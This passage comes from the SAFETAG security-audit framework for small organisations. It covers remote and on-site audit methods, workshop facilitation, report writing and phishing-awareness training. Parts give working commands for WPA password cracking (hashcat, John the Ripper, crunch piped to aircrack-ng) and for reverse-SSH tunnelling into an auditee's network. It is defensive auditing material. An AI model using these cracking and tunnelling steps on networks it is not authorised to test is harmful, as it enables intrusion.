(a\n\"combinator\" attack), so that it includes an entry for each pair of these\nstrings:\n\nYou can do a 1-way version of this list simply, such as:\n\n```\n $ for foo in `cat pwdlist.txt`; do for bar in `cat pwdlist.txt`; do printf $foo$bar'\\n'; done; done > pwdpairs.txt\n $ cat pwdlist.txt >> pwdpairs.txt\n```\n\n[Hashcat](http://hashcat.net/oclhashcat/) can do this in a live attack under\nits \"combinator\" mode, and hashcat-utils (hiding in\n/usr/share/hashcat-utils/combinator.bin) provides this as a standalone tool.\nThis provides a true combination of the list, so it exponentially increases\nthe list size - use with caution, or use with one larger dictionary and one\nsmaller dictionary.\n\nFor example, use these combination approach on your custom dictionary\n(combining it with itself, creating combinations from the above list such as\nexample92, journorights, exampleorgrights).\n\n\n```\n$  /usr/share/hashcat-utils/combinator.bin dict.txt dict.txt\n\n```\n\nHashcat is extremely powerful when you have desktop computer systems to use,\nbut has a few wordlist manipulation tools that are useful regardless.\n\nMore References: (http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2 ,\nhttp://www.darkmoreops.com/2014/08/18/cracking-wpa2-wpa-with-hashcat-kali-linux/\n)\n\n\n**Use word mutation with John the Ripper (JtR)**\n[JtR](https://github.com/magnumripper/JohnTheRipper/commits/bleeding-jumbo) is\na powerful tool you can use in combination of existing wordlists, but it also\ncan add in common substitutions (people using zero for the letter \"o\"). JtR\ncan be used to generate a static list of passwords for other programs, or it\ncan be used directly against a password database. JtR is a bit weak combining\nwords within a wordlist, so you should apply your customizations and any\nfolding before moving on to JtR.\n\nYou can add custom \"rules\" to aid in these substitutions - a base set is\nincluded with JtR, but a much more powerful set is added by [KoreLogic]\n(http://contest-2010.korelogic.com/rules.html). KoreLogic also provides a\ncustom character set \"chr file\" that takes password frequency data from large\ncollections of [real-world passwords to speed up JtR's brute force\nmode](http://www.korelogic.com/tools.html). This PDF presentation has a good\n[walkthrough of how John and Kore's rules\nwork](https://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-OWASP-Feb.pdf).\n[LinuxConfig](http://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux)\nOffers another good walkthrough.\n\nThe bleeding-edge jumbo version combines both the built-in rules and an\noptimized version of the [KoreLogic\nrules](https://github.com/kost/jtr-stuff/tree/master/rules, and\nhttp://openwall.info/wiki/john/rules for a description of the optimizations).\n[This list of KoreLogic\nRules](http://contest-2010.korelogic.com/rules.html) provides nice\ndescriptions of what the KoreLogic rules do.  In bleeding-jumbo, you can\nremove \"KoreLogicRules\".\n[BackReference](http://backreference.org/2009/10/26/password-recovery-with-john-the-ripper/)\nprovides a great example of rules usage.\n\nSome particularly useful ones individual rulesets are:\n* AppendYears (appends years, from 1900 to 2019) and AppendCurrentYearSpecial (appends 2000-2019 with punctuation)\n* AddJustNumbers (adds 1-4 digits to the end of everything)\n* l33t (leet-speek combinations)\nThere are some build-in combinations of rulesets - for example, just --rules\nruns john's internal collection of default rules, and --rules:KoreLogic runs a\ncollection of the KoreLogic rules in a thoughtful order, and --rules:all is\nuseful if you hate life.\n\ne.g. :\n```\n$ john -w:dictionary.txt --rules:AppendYears --stdout\n```\n\n[Building custom rules](http://www.openwall.com/john/doc/RULES.shtml)\n\n\n**PROTIP** Create a dictionary with just \"blah\" and run various rules against\nit to understand how each ruleset or combination works. Note specifically that\neach rule multiplies the size of the dictionary by the number of permutations\nit introduces. Running the KoreLogic ruleset combination against a **one\nword** dictionary creates a list of 6,327,540 permutations on just that word,\nadding a column output is handy for additional visual impact.\n\n```\nJohnTheRipper/run/john -w=blah.txt --rules:all --stdout |column\n```\n\n**Brute force, using John and crunch** JtR's \"incremental\" mode is essentially\nan optimized brute force attack, so will take a very long time for anything\nbut the shortest passwords, or passwords where you can limit the search space\nto a character set: \"As of version 1.8.0, pre-defined incremental modes are\n\"ASCII\" (all 95 printable ASCII characters), \"LM_ASCII\" (for use on LM\nhashes), \"Alnum\" (all 62 alphanumeric characters), \"Alpha\" (all 52 letters),\n\"LowerNum\" (lowercase letters plus digits, for 36 total), \"UpperNum\"\n(uppercase letters plus digits, for 36 total), \"LowerSpace\" (lowercase letters\nplus space, for 27 total), \"Lower\" (lowercase letters), \"Upper\" (uppercase\nletters), and \"Digits\" (digits only). The supplied .chr files include data for\nlengths up to 13 for all of these modes except for \"LM_ASCII\" (where password\nportions input to the LM hash halves are assumed to be truncated at length 7)\nand \"Digits\" (where the supplied .chr file and pre-defined incremental mode\nwork for lengths up to 20). Some of the many .chr files needed by these\npre-defined incremental modes might not be bundled with every version of John\nthe Ripper, being available as a separate download.\"\n(http://www.openwall.com/john/doc/MODES.shtml)\n\nAs a last resort, you can try a direct brute force attack overnight or\npost-audit to fill in details on key strength.  Crunch is a very simple but\nthorough approach. Given enough time it will break a password, but it's not\nparticularly fast, even at simple passwords. You can reduce the scope of this\nattack (and speed it up) if you have a reason to believe the password is all\nlower-case, all-numeric, or so on. WPA passwords are a minimum of 8\ncharacters, a maximum of 16, and some wifi routers will accept punctuation,\nbut in practice these are usually just !@#$. — so:\n\n```\n$ /path/to/crunch 8 16\nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890$!@#$. |\naircrack-ng -a 2 path/to/capture.pcap -b 00:11:22:33:44:55 -w -\n```\n\nThis says to try every possible alpha-numeric combination from 8 to 16\ncharacters. This will take a very, very, very long time.\n\n\n###### Further Resources\n\n**Sample Practice** For practice on any of these methods, you can use the\nwpa-Induction.pcap file from\n[Wireshark](http://wiki.wireshark.org/SampleCaptures).\n\n[https://www.schneier.com/blog/archives/2014/03/choosing_secure_1.html](https://www.schneier.com/blog/archives/2014/03/choosing_secure_1.html)\n\n[http://zed0.co.uk/crossword/](http://zed0.co.uk/crossword/)\n\n[http://www.instantcheckmate.com/crimewire/is-your-password-really-protecting-you/#lightbox/0/](http://www.instantcheckmate.com/crimewire/is-your-password-really-protecting-you/#lightbox/0/)\n\nNote that password cracking systems are rated on the number of password\nguesses they make per second.  Stock laptop computers without high-end\ngraphics cards or any other optimizations can guess 2500 passwords/second.\nMore powerful desktop computers can test over a hundred million each second,\nand with graphics cards (GPUs) that rises to billions of passwords per second.\n([https://en.wikipedia.org/wiki/Password_cracking](https://en.wikipedia.org/wiki/Password_cracking)).\n\nThis website has a good explanation about how improving the complexity of a\npassword affects how easy it is to break:\n[http://www.lockdown.co.uk/?pg=combi](http://www.lockdown.co.uk/?pg=combi),\nbut is using very out of date numbers - consider a basic laptop able to\nproduce \"Class E\" attacks, and a desktop, \"Class F\"\n\n[http://rumkin.com/tools/password/passchk.php](http://rumkin.com/tools/password/passchk.php)\n\n[http://cyber-defense.sans.org/blog/downloads/](http://cyber-defense.sans.org/blog/downloads/)\nhas a calculator buried in the zip file \"scripts.zip\"\n\n[http://www.dailymail.co.uk/sciencetech/article-2331984/Think-strong-password-Hackers-crack-16-character-passwords-hour.html](http://www.dailymail.co.uk/sciencetech/article-2331984/Think-strong-password-Hackers-crack-16-character-passwords-hour.html)\n\n[https://www.grc.com/haystack.htm](https://www.grc.com/haystack.htm)\n\n[https://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-OWASP-Feb.pdf](https://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-OWASP-Feb.pdf)\n\n[http://www.nytimes.com/2014/11/19/magazine/the-secret-life-of-passwords.html?_r=1](http://www.nytimes.com/2014/11/19/magazine/the-secret-life-of-passwords.html?_r=1)\n","recommendations":"Any important password should be long enough and complex enough to prevent\nboth standard dictionary attacks and “brute-force attacks” in which clusters\nof powerful computers work in parallel to test every possible character\ncombination.

Once the participants have brainstormed these out the facilitator leads the participants in identifying  critical processes (this may be all of the processes identified).\n  * Quickly identify the main purpose of the organization.\n  * Once a complete list has been created, the auditor will then go through through to identify with the participants the critical processes within the organization – that is, without these processes the organization would not be able to function or function at a very poor level, or would not fulfill its mission\n\n  *NOTE:* If an auditor does not ensure that the uniquely identified subset of processes speaks to the full range of participants, their recommendations are more likely to be met with resistance.\n\n* **Map out critical processes:** In this exercises the auditor does free-hand drawing (ideally on a whiteboard to allow for easy changes) mapping for each process guided by the host participants. The auditor needs to make sure that they work to develop a broad understanding of the overall process.

This entails going\nthrough each asset and evaluating its sensitivity (high - red, medium -\norange, low - green). Healthy discussion is encouraged.\n* Often groups will lean towards marking everything high sensitivity, but this\nis not helpful when prioritizing defensive strategies.\n* A way to support the groups and help them calibrate their ranking is by\nasking them to compare assets to one another. Compare two high sensitivity\nassets. Are they equally sensitive? Compare to another asset.

Constant communication\nand participation are the keys for a successful remote audit.\n\nAfter preparing the list in \"materials_needed\", you may first start selecting\nor combining different approaches in conducting remote audit.\n\nThere are four different approaches you can use, depending on what resources\nare available, the size and structure of the organization, and which\nactivities you are trying to facilitate remotely. Is there someone that can\nhelp as an on-site facilitator? Are video conferences realistic (given\nbandwidth and cost)? How does the approach you use interact with existing\norganizational team structures?\n\n* **Approach 1: On-site facilitator**: This provides the most valuable\ninteraction, but requires a person who can take on the facilitation role\non-site, while the auditor is over video chat.  The facilitator does not have\nto be a technical person, but should be able to manage the session, making\nsure that it is as inclusive and as productive as possible. Accommodates more\nparticipants per session than Approach 3 per session.\n\n* **Approach 2, hybrid online/synchronous**: This can be used with a large\ngroup of participants where it is possible to meet over multiple sessions with\nenough time to collect and analyse responses in between.\n\n* **Approach 3, multiple small sessions**: Consists of multiple small full\nsessions over video chats, of no more than four participants at a time to\nassure inclusiveness. Suitable for medium to large groups where it is possible\nto conduct multiple small video chats.\n\n* **Approach 4, hybrid offline/surveys**: This leverages surveys and shorters\ncalls or emails.

This will help in building rapport, and address any concerns participants may have, as well as allow for further testing of communication channel.\n* The auditor ask participants to fill in a template or survey to collect information needed (See Approach 4 for survey details), this stems directly from the activity, whether it is data assessment, process mapping, threat analysis, or any activity requiring facilitation.\n* Participants send their input to auditor, either through answering into and online questionnaire, or through any other media agreed on.\n* Auditor collect the information and arrange them for analysis and discussion.\n* Another video chat is conducted to discuss responses and expand and validate on information collected through the survey.\n* Follow up sessions may be arranged with selected groups of staff as needed.\n###### Approach 3, multiple small sessions\nSuitable for medium to large groups where it is possible to conduct multiple\nsmall video chats. It is recommended for sessions to be arranged to include\npeople from the same organizational level, but different\nfunctions/teams/arms/departments of the organization.  This approach scales to\nlarger organizations and helps ensure voices at different levels of the\norganization are heard.\n* Auditor works with participants via video chat through the full exercise and discussion.\n* Follow up sessions may be arranged with selected groups of staff as needed.\n\n###### Approach 4, hybrid offline/asynchronous\n* Introductory email/session through local facilitator (may need to provide remote training on the activities).\n* Collect responses and input through a survey.\n* Discuss responses and finding via email or voice chat to expand and validate.\n**Sample Questions: Data Mapping**\n\n* Where does your organizational email live?

Instead of relying on an individual, the auditor will rely on\ntunneling into a device located in the physical space of the auditee. This can\nbe done in two ways:\n\n1. Remote Desktop or remote VPN into targeted Network. Remote Desktop is\ntunneling into a targeted machine that lives on the same targeted LAN network\nwhere you wish to scan the network and do the device assessment; the auditor\ncontrols the machine remotely and uses it as the auditor machine.\n2. VPN to a trusted VPN server. In this case, the auditee will connect one of\ntheir machines to a trusted VPN server, and the auditor will connect to the\nsame VPN server, allowing both LANs at the auditee's and auditor's ends to\nconnect.\n","materials_needed":"###### Scenario 1\n\n- A machine accessible globally via ssh.

It could be a machine or\na virtual server\n- A: Auditor's GNULinux machine\n- C: A machine running GNULinux or Mac with ssh on the auditee's end\n\nInstruct the auditee to initiate a connection to the server (S) and set up a\nreverse ssh server:\n\nLet's assume we have a server named safetag-audit.org (S), and usernames for\neach auditee called auditee1, auditee2, etc.\n\n- on the auditee's machine (C); the auditee will need to be instructed to run\nthe following commands:\n\n      service sshd start\n      ssh -R 2200:localhost:22 auditee1@safetag-audit.org\n\n  (the auditor has to provide the auditee with a password for the password prompt that will appear when this command is entered.)\n  this will allow any connection to port 2200 on safetag-audit.org (S) to be sent to port 22 on the auditee's machine (C). The remote port is an arbitrary high number port (> 1023); a practice can be established to assign a number to each location and machine.\n\n  **example**:\n  the auditee on machine on site 0 could be instructed to run:\n\n      ssh -R 2200:localhost:22 auditee0@safetag-audit.org\n\n  this will allow the auditee to connect to port 2200 from within safetag-audit.org (S) and have traffic forwarded to port 22 on the auditee's machine (C).\n\n  the auditee on machine on site 1 will run:\n\n      ssh -R 2210:localhost:22 auditee1@safetag-audit.org\n\n**Important**: make sure that the ports you use don't conflict with ports by\nother services or auditees, i.e. don't use a port number twice.\n\nOnce this session is open, the auditor can access the auditee's machine (C).\nAt this point there are a few powerful options:\n\n* simply ssh from S to C via the tunnel (port defined in the reverse tunnel on\nthe server localhost interface);\n\n**example**:\n\nto connect to site 0:\n\n      ssh clientUser@localhost -p 2200\n\nwith site 1 in the previous example, the port would be 2210 (or whatever the auditee used in her command).\n* Create a VPN-like connection to site:\n  - create a forward tunnel from A to S that is \"piped\" into the reverse tunnel:\n\n          ssh -L 2200:localhost:2200 user@safetag-audit.org\n\n  now you have a tunnel from your localhost:2200 to  safetag-audit.org:2200, which in turn has a tunnel from  safetag-audit.org:2200 to the client machine on port 22.\n  - once you have that, you can use [sshuttle](https://sshuttle.readthedocs.io) (needs to be installed, it's in most Linux standard repositories) on the auditor's machine (A) to access additional resources in the auditee's network (as long as they are non-ICMP) directly from the Auditor's machine (A). Such resources might include web-based resources (router web interface for example) or remote desktop (to assess windows or mac clients) or accessing file shares on the auditee's network, etc...\n    to do this, you would need to use client credentials through the tunnel you just created, and provide the client subnet to route traffic correctly through that \"VPN\":\n\n          sshuttle -r user@localhost:2200 192.168.1.0/24\n\n   once this tunnel is created, you should be able to access any resource on the remote network by its IP and port (for example, through the browser for http(s))\n\nAn additional thing that one might want to do is making the connection from C\nto S passwordless and automatic (this can be accomplished with tools or\nscripts readily available on the internet).\n\n***WARNING***: Make sure to remove/clean any persistent connections once you\nare done with auditing.\n\nThere should be no need for multiple reverse tunnels, as multiple forward\ntunnels can be set up from S to C if needed (eg. VNC or RDP); this requires\nmultiple forward tunnels from A to S though.\n\n\n###### Scenario 2\n\n**Legend**:\n\n- A: Auditee's local machine; a clean machine, connected to the Internet\nthrough the auditee's LAN network\n- B: Auditor machine\n\nSomeone at the auditee's side will prepare machine A in coordination with the\nauditor, then install [TeamViewer](https://www.teamviewer.com/en/).\n\nAfter that, and using a trusted communication method, TeamViewer ID and\npasscode will be sent to the Auditor.\n\nThe auditor will use the ID and passcode to connect to the machine and start\nusing machine A as the auditing machine.\n\nThere are pros and cons for this:\n\n**Cons**:\n\n1. Internet speed: You will need a high speed Internet connection to achieve\nsuch task, as the remote access will be transferring the desktop of the\ntargeted machine to you in order to do the tasks.\n2. Connection interruption: While you are working remotely, you might face\nsome connection interruptions during your session, and restarting the remote\naccess will be a challenge because in most of the cases you will need someone\nat the other end to authorize you to tunnel into the machine.\n3. Physical limitations: You are still physically far from the machine, which\nmeans you cannot connect a USB drive to boot from it or do any other tasks\nthat require you to be near the device.\n4. Installing Kali Linux might be hard: It might be hard for a non-technical\nperson to prepare a Kali Linux machine\n\n**Pros**:\n\n1. Usability: TeamViewer is easy to install and use. Anyone with basic\nknowledge on how to install software can assist you with preparing the\nauditing machine.\n2. Network speed: Technically, your auditing machine is the machine you are\nconnected to, which is physically located in the targeted office and connected\nto the LAN network. This means that you will have full speed running your\naudit tasks.\n\n**Note**: Some remote assistant software provides VPN solutions that turn\nMachine A into a VPN Server and allow Machine B to VPN into it. Tunneling into\nthat VPN server will allow you to connect to the local LAN network, which will\nallow you to use Machine B to run the audit.\n\n\n###### Using an in-the-middle trusted VPN server\n\n**Legend**:\n\n- A : Auditee's local machine; a clean machine, connected to the Internet\nthrough the auditee's LAN network\n- B: Auditor's machine\n- C: OpenVPN Server\n\nAuditee's Network --------- (A) ---------- C ---------- (B) ----------\nAuditor's Network\n\nThe auditor will put efforts preparing an OpenVPN server (C) and create 2\nprofiles (Keys and configurations) to allow machines A and B to connect to C.\n\nGet a VPS from your favorite and trusted VPS provider and keep in mind the\nphysical location of the server, then install OpenVPN Server by following the\ninstructions contained in [this guide on Ubuntu\nServer](https://help.ubuntu.com/lts/serverguide/openvpn.html).\n\nThe default configuration of OpenVPN will not allow the clients (A-B) to see\neach other on the network. To allow that, you have to enable client-to-client\ndirective and enable your both subnets (Auditee and Auditor) to see each\nothers networks. To do so, follow [these\ninstruction](https://community.openvpn.net/openvpn/wiki/RoutedLans).\n\nAfter finishing the installation and testing it, the auditor will pass the\n.ovpn file to the person at the auditee's site through a trusted way, and\nprovide instructions on how to install and connect to the server. After\nconnecting A and B to C, the auditor will be able to start the network and\ndevice assessment at the other end.\n\n**Note**: In case the VPN is censored in A or B's countries, or in both, you\ncan follow [these\ninstructions](https://www.pluggabletransports.info/implement/openvpn/) on how\nto bypass the censorship by using pluggable transports.   \n","recommendations":""}}},{"node":{"fields":{"slug":"/activities/report_creation"},"frontmatter":{"title":"Report Creation","summary":"This component consists of an auditor compiling their audit inputs like notes and recommendations into an easy to digest document or similar that will let the organization have the recommendations roadmap that will guide the hosts progression to meet their security goals (also called the Risk Mitigation Plan) at hand, and other useful information as needed like   the current state of the organization's security, the process by which the auditor came to that assessment, its scope, and the more technical outputs of some of the conducted activities, among others.

If written with care, it can be a tool to encourage agency and guide adoption. The report might have many audiences who will need to use it in different ways. For the auditor and the organization, it acts as documentation of what an auditor accomplished. For the organization, it will be a guide for connecting vulnerabilities to actual risks, a rallying cry for change, and proof of need for funders. For those the organization brings in to support their digital security, it provides a roadmap towards that implementation and a task-list for future technologists and trainers tasked to get the host there - as well as a checklist for validating that threats have been addressed.\n\n* **Target Invested Parties:** Identify parties who will impact the vulnerability remediation process (e.g. funders, external contractors, partners) during the audit and work with the organization to target components of the report at those parties.

It should only be shared as a complete work between the auditor(s) and the identified leadership and points of contact of the organization.\n","walk_through":"This walk-through assumes you already completed the Roadmap Development activity, or at least you are conducting them together.\n\n1. **Prepare narrative components:** some audit reports try to avoid writing many narrative sections, however, at the very minimum, an executive summary and a clear description of the scope should be included. Given that no audit will cover everything in terms of technologies and assets, that section will be useful to the organization to understand what is out of scope and to the auditor to have peace of mind in case something goes wrong with the organization's security involving something that couldn't be covered during the assessment. Other narrative sections that can be included (but are entirely optional) are descriptions of the agreement, glossary, and a description of the SAFETAG audit process, among others.  \n2. **If you want to include threat modeling information:** there are a set of strategies you can follow that will help the organization understand better what their common understanding of security is, and what threats should be prioritized and expected to be addressed by the rest of the report:  \n\n   1. Create charts and visuals for roadmap, risk-matrix, and critical processes.  \n   2. Write explanations for any adversaries or threats that the auditor identifies as \"un-addressable\" given the organization's current capacity.  \n3. **If you want to include activity information:** you can include what you did in different levels of detail. This might add a considerable amount of writing time and space in the final report, but it can be advisable if the organization has the capacity to replicate the activities by themselves to check if the vulnerabilities were effectively solved and to update the assessment..  \n\n   1. Document the activities conducted and the tools used for testing where needed.  \n   2. Describe the instructions to follow to replicate the assessment by activity.  \n4. **Define how the roadmap will be presented:** the most important part of the report is the recommendation roadmap (also known as the risk mitigation plan), so it is very important to present it in a way that is easy to understand and follow by the organization. It focuses on the most relevant recommendations (and with that, the most important threats to address), and presents realistic measures the organization can implement considering their capacities and bandwidth. There are many ways to organize this information, and we suggest checking these two [blog](https://safetag.org/posts/2018-11-19-challenges-of-reporting) [posts](https://safetag.org/posts/2018-11-20-challenges-of-reporting-2) to find more information and ideas. Some of the most common are the following:  \n\n   1. **Directly:** presenting a short and concise list of prioritized recommendations. The level of detail on each item will depend on the capacity of the organization to understand the recommendation and know what to do about it.  \n   2. **From assets or aspects:** Sometimes it is better for the organization to have separated the recommendation by buckets that let them decide what to tackle first or have people in charge of the execution of specific parts of the plan. Some usual categories are website, office computers, physical office space, communication processes, and online account management. Keep in mind that sometimes there are recommendations covering more than one aspect or asset, so this might lead to repetition.  \n   3. **From vulnerabilities or threats:** from a risk perspective, it makes sense to tie the recommendations to the threat model of the organization, and in a well-developed roadmap, this connection should be covered by design. However, sometimes we want to present that threat landscape in a more explicit way, especially if some recommendations are not obviously connected with the threat model (this happens frequently with more technical recommendations, where the organization struggles to understand why they should implement it, for instance). The narrative flow usually considers describing the vulnerability and then listing the recommendations to mitigate it. Like the previous item, keep in mind that some recommendations can cover different vulnerabilities, opening space for repetition in the report.  \n5. **Develop the report contents:** it can be useful to include resources and other references that might help the organization while navigating the report. Another useful recommendation is, unless requested otherwise, to not dig too deep into the specifics of the implementation of recommendations as long as they are self-explanatory enough that the organization knows what must be done and find specific guidance on their end.  \n6. **Deliver the report to the organization:** Once the report is ready, it might not be enough to send it to the organization\\[1]; you should make sure they understand it and can find the information they expect. Also, it will be valuable to reinforce the most important recommendations to implement in the short term and general next steps they can follow to explore further actions from the content of the report. Again, try to have a meeting or call to present the report and cover these aspects more effectively.  \n7. **Schedule a follow-up contact:** you might be interested in checking if the organization was able to follow the implementation plan you proposed and find any potential gaps that might emerge and require further guidance. Please check the [\"Follow up meeting\"](https://safetag.org/activities/follow_up_meeting) activity.  \n8. **Contribute back to the SAFETAG framework:** In case you implemented some changes to activities or develop new activities, consider contributing those back to the framework. To do so, please get in touch with the SAFETAG team at info@safetag.org.\n\n**\\[1]** \"When a pilot lands an airliner, their job isn’t over.

This provides a rough, suggested outline of how to schedule your time on site for a SAFETAG audit, and some reminders of the work you need to have completed before arriving in country. You may adapt this plan or use its sections as a template to develop your own timeline fitting the context of each audit.","materials_needed":"","considerations":"","walk_through":"#### Prepare for Uncertainty\n\nThe SAFETAG roadmap is a crisp, clear data flow of inputs to outputs.  Reality, generally speaking, is less direct.  There are a few core parts of the audit process that force action, but others are more flexible.  Outcomes of your discussion and exploration of the network will also derail the process in impossible-to-predict ways.  The pre-audit interviews and your own contexts research, research on the organization, and preparation are meant to give you the best possible idea of what situation you'll walk in to, but even with all of that, frankly, shit happens.\n\n#### Before Travel\n\n* Agreements, Scope, Risk Analysis\n* Remote Research\n  * Openly sourced data: DNS, MX, Web, research via social media and google\n  * Revealed information encountered during preparation / etc. (office IP address?), nmap\n* Packing and Prep\n  * Visas / Travel planning\n  * Hardware packing\n  * Software (run updates) and dictionary list prep (local language dictionaries, plus creation of a custom password list based on website keywords, addresses, and dates)\n\n\n#### First Day\nPriorities for the first day include meeting staff (even, possibly especially, for the more technical auditor).  There is a strong temptation to dive in and get started, but establishing connections with the staff - especially those you haven't met through interviews - is key.  You may discover hidden sources of talent or resistance, historical information, and new parts of the infrastructure or practices and policies that you may not have yet found.\n\n* Meet staff, discuss operations and plan interruptions with key staff\n* In-person discussions of risks, challenges, fears, questions, and experiences around digital security\n* (If relevant) Attempt to crack wifi without password knowledge\n* Parallel, collect wifi beacons while not associated to any one network (sending connection resets).\n* Once wifi password is obtained (through cracking or asking), start a capture of decrypted traffic and run it as long as possible for later analysis\n* Map out the “visible” network (nmap)\n\n\n#### Early steps\nFrom a data-gathering point of view, the first steps are to try and access the wireless network by password guessing, but also to connect to the network and capture traffic for analysis overnight.  This provides other views on the actual technology and services used on the network, different both from the management and IT view as well as other tools discussed by staff.\n\n* Associate nmap scans, MAC addresses, and beacons with people and specific systems, plus servers/networking hardware\n* Scans on the captured traffic for passwords, auth cookies, suspicious traffic, unencrypted connections\n\n#### Further Days (on Location)\n\nThe next day you’re on location, you have hopefully looked through the research data you gathered, and have some specific follow-up things to investigate.  It’s also now time to start going through the audit tasks.\n\n* Deeper dive into what hardware is connected and what it is doing\n* Begin organizing vulnerabilities and tracking against the audit framework\n* External audit tasks\n* Internal audit tasks\n* Physical audit tasks\n\n\n#### Final Day (on Location)\n\n* Discuss initial findings and responses\n* Suggestions for follow-up training, resources to consult, and possibly targeted trainings for relevant staff (what is a secure password? How to communicate securely?)\n* Discuss next steps: SAFETAG Report, connections to trainers, how to seek help\n\n\n#### Exploration and check-ins\n\nThroughout the entire audit, aggressively make time to engage with staff - stop for coffee, eat lunch with them, have conversations.  This can be integrated in to other parts of the process, such as the user device assessments, as well as being completely independent and natural.  Having better connections with staff will make the group exercises, especially the risk assessment work, flow much better.\n\nWhenever you set off a scan (airodumping, nmap, openvas...) are good times to stand up and walk around.\n\n#### Debrief and Setting Expectations\n\nLargely covered in the [debrief] section, making time at the end of the (often hectic) audit week is very important to making sure the next few steps are absolutely clear in terms of timelines and communication protocols.\n\n\n#### Clean up\n\nIf you have been using paper or post-it notes during the audit, be sure you securely destroy them (by shredding, burning, or tearing into small pieces) before you leave the site on the last day.  By the same token, any digital reports should be stored on secure media and securely deleted from all other locations.  See the [operational security section](https://LINKBEFORELAUNCH) and per-item notes for further details. Clean off any whiteboards used, and check any camera used to remove sensitive photos.\n\n#### Follow up care and Reporting\n\nSee the reporting, support, and follow-up Methods for specific details here, but a series of check-ins with the organization to support their ability to respond to any incidents, understand further topics from the debrief, and to help provide them a timeline to expect the final report is valuable in maintaining their engagement post-audit to support the needed changes.\n","recommendations":""}}},{"node":{"fields":{"slug":"/activities/scavenger_hunt"},"frontmatter":{"title":"Scavenger Hunt","summary":"This activity assists in identifying potential physical security concerns at\nan organization, particularly when an auditor cannot travel to the office\nlocation or cannot visit every office location.

If no suggestions are forthcoming, we can prompt participants with the obvious stuff:\n\n* Computer hard drives\n* USB flash drives\n* External hard drives\n* Cellphones\n* CDs & DVDs (and BDs)\n* Our email inbox\n* The Cloud: Dropbox, Google Drive, SkyDrive, etc\n* Physical copies (or “hard copies”) in the office\n* Multimedia: Video tapes, audio recordings, photographs, etc.\n\nUse large stickies to place these as column headers on a wall.  More will come up later in the course of the exercise.\n\nElicit from participants what type of information or data they have in each of these places. For example:\n\n* Email\n* Contact details, such as a member database\n* Reports/research\n* Funder information / contracts\n* Accounts/spreadsheets\n* Videos\n* Images\n* Private messages on Facebook, etc.\n\nTo encourage participant interaction, write one example on a sticky and place it in the appropriate box in the matrix. Then, ask whether there is another copy of this data somewhere. If there is, you can use another sticky and put it wherever they keep the duplicate.\n\n*TIP:* Place Computers, Phones, and Email next to each other, so you won't have to create duplicates for everything \"stored\" in email (and therefore on laptops and phones)\n\nIntroduce a new vertical axis representing sensitivity. The higher on the chart, the more sensitive the data.  Ask the participants to rank data.\n\nFor a large group, divide the group into smaller teams for the next steps (it helps if there are relatively clear thematic distinctions within the group, such as nationality, type of work, area of interest, etc.)\n\nProvide stickies to the group(s).  Have the group(s) brainstorm about all of the data they work with, focusing on the most important data first.\n\nParticipants should write ONE type per sticky, and create duplicates if the data is stored in multiple locations.\n\nFor a small group, this can be done as a \"live\" brainstorm.  For larger groups that have been subdivided, have each group finish listing out their most important data and then have each group place the stickies on the matrix.  Invite discussions around the sensitivity of the data.\n\nAn example may look something like this:\n\n![Level Up Backup Matrix Example with a matrix filled in with stickies representing specific types of data stored in different locations (e.g. email, shared drive, backups)](/img/activity_sensitive-data_backup-matrix-example.png \"Example of a filled in matrix\")\n\nExplain that this gives us an idea of where our data is. Elicit whether or not this is all the data we generate? Of course it isn't: It's only a small percentage.\n\nThe LevelUp lesson uses this primarily to discuss the importance of backups, and this is a valuable point to make.\n\nCall out the information that they are keeping on their computer's hard drive (which will usually be the fullest one). Elicit some of the things that can cause a computer to stop working. Maybe take a show of hands: Who has had this happen to them?\n\n* Virus or malware attack destroyed a computer or some data\n* Stolen computer, confiscated computer\n* Infrastructural problems, like a power failure broke a computer\n* Inexplicably bricked computer, etc.\n\nFor SAFETAG, we focus on the \"Sensitive data in the wrong hands\" section.  Based on the clustering of sensitive data along the vertical access, choose a column that has an unsual amount of sensitive data (email or computers, usually).\n\nRemove the stickies from the column but keep them in your hand and read them. Now I have this information. What can I do with it? And what are you left with?  Is anyone at risk - yourselves? partners?  If this were published on the Internet, what would happen?\n","recommendations":"Laptops, workstations, servers, external hard drives, and backup systems should be configured to use some form of hard drive encryption.\n* For Windows, Microsoft BitLocker is built in to the latest versions, free-of-charge for anyone with a valid Windows 7 “Ultimate” license or Windows 8.\n* For Apple OSX users, FileVault2 is a built-in alternative that is also free-of-charge.\n* TrueCrypt is a cross-platform solution that is open source and free of charge, and can work on Mac, Windows, and Linux machines as well.\nAll three solutions provide a way to encrypt data on internal drives as well as external hard drives, and USB memory sticks.\n"}}},{"node":{"fields":{"slug":"/activities/social_engineering"},"frontmatter":{"title":"Social Engineering","summary":"This component focuses on assessing and educating organizational staff on how\nto prevent, identify, and respond to social engineering attempts (Phishing,\ninformation gathering, cons) that lead to Malware and handing over\nauthentication tokens/information.\n\nThe educational activities within this section are provided as an alternative\nto actual social engineering attacks against the organization.

The activity is called [Analyzing a Potentially\nHarmful\nEmail](https://level-up.cc/curriculum/malware-protection/using-antivirus-tools/activity-discussion/analyzing-potentially-harmful-email/l).\n\nIn this exercise participants will examine an email for clues about its\nauthenticity.\n\n**Materials to Prepare**\n* A “malicious” example e-mail. Details below on how to create your own (which will take an hour or so to prepare, though once it is prepared you don't need to do so again).\n  * You can identify examples \"in the wild\" or from news stories to use, although creating your own can provide more utility and practice for training participants throughout a malware training session, since you can ensure it illustrates everything you want to cover.\n  * Be sure you have examples of very obvious and general malicious phishing email (that most participants would be suspicous of when paying attention), and a very convincing spearphishing email.\n* Example infected attachment (you may want to use this one, which has the EICAR test virus).\n* (Optional) Example phishing website which should be created using XAMPP and HTTrack. (Approximately 90 minutes to set up for the first time, though once it is prepared you will only need to turn on XAMPP for the demonstration)\n* Flipchart or whiteboard with markers (flipcharts are often preferred so you can keep the notes from the session to refer to later as needed)\n* Projector\n**Creating the \"malicious\" example email**\n* Send an e-mail to yourself and export it as a .EML file (Mail message file) so that you can edit the source code. You can use Notepad or any other text editor to do so.\n  * To export to EML in Outlook, simply select your message and click “Save As”. Then select “Outlook Message Format - Unicode” as your file type.\n  * In Thunderbird, right-click on the e-mail message you would like to export and select “Save as”. Leave “All files” as your file type.\n  * If you’re using GMail, click the down arrow next to “Reply” in the header area of the e-mail you want to save. Select “Show original” from the menu that 